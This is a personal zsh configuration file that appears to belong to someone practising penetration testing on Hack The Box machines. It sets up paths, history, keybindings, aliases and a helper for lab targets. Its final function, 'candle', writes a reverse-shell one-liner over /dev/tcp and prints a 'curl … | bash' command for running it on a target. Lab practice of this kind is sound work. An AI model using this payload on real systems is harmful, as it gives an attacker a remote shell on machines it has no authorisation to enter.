# --- Environment Variables ---
export PATH=$HOME/bin:/usr/local/bin:$HOME/.local/bin:$PATH
export PATH=$PATH:$HOME/.cargo/bin        # For your Rust tools
export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin # For your Go tools
export EDITOR='nano'
export STARSHIP_CONFIG=$HOME/.config/starship/config.toml

# --- History Configuration ---
HISTFILE=~/.zsh_history
HISTSIZE=10000
SAVEHIST=10000
setopt APPEND_HISTORY      # Append to history file rather than overwrite
setopt SHARE_HISTORY       # Share history between different instances

# --- Completion System ---
autoload -Uz compinit && compinit
zstyle ':completion:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # Case-insensitive completion

# --- Keybindings ---
bindkey -e                 # Use Emacs-style keybindings
bindkey '^[[H' beginning-of-line # Home key
bindkey '^[[F' end-of-line       # End key
bindkey '^[[3~' delete-char      # Delete key
bindkey "^[[1;5C" forward-word   # Move by word
bindkey "^[[1;5D" backward-word  # Move by word
bindkey "^[[1;2C" forward-char
bindkey "^[[1;2D" backward-char
bindkey ';5C' forward-word
bindkey ';5D' backward-word

# --- Pentesting & Utility Aliases ---
alias ls='ls --color=auto'
alias ll='ls -alF'
alias grep='grep --color=auto'
alias ..='cd ..'
alias ip='ip -color'

# --- Initialize Prompt ---
eval "$(starship init zsh)"                                 # starship
[[ -f "$HOME/.cargo/env" ]] && source "$HOME/.cargo/env"    # rustup

# --- Vistual Code 
alias code='code-oss --no-sandbox --user-data-dir="$HOME/.vscode-oss"'

# --- Machine Function
# Function to set up a new HTB machine
target_add() {
    local machine_name=$1
    local machine_ip=$2

    if [[ -z "$machine_name" || -z "$machine_ip" ]]; then
        echo "Usage: htb_target <name> <ip>"
        return 1
    fi

    # Create directory in your HTB folder
    local target_dir="$HOME/HTB/$machine_name"
    mkdir -p "$target_dir"
    cd "$target_dir"

    # Save target info for Polybar
    echo "$machine_name - $machine_ip" > ~/.config/polybar/.current_target
    
    echo "Successfully set target: $machine_name ($machine_ip)"
    echo "Directory created and switched to: $target_dir"
}

# Alias to clear the target when done
alias target_clear='echo "None" > ~/.config/polybar/.current_target'

# Function to create candle
candle() {
   local interface_name=$1
   local port=$2

    if [[ -z "$interface_name" || -z "$port" ]]; then
        echo "Usage: candle <interface_name> <port>"
        return 1
    fi

   local ip=$(bash -c "ip addr show $interface_name | grep -oP '(?<=inet\s)\d+(\.\d+){3}'")
   echo "sh -i >& /dev/tcp/$ip/$port 0>&1" > candle

   echo "Candle: $ip:$port"
   echo "Usage: curl $ip/candle|bash"
}
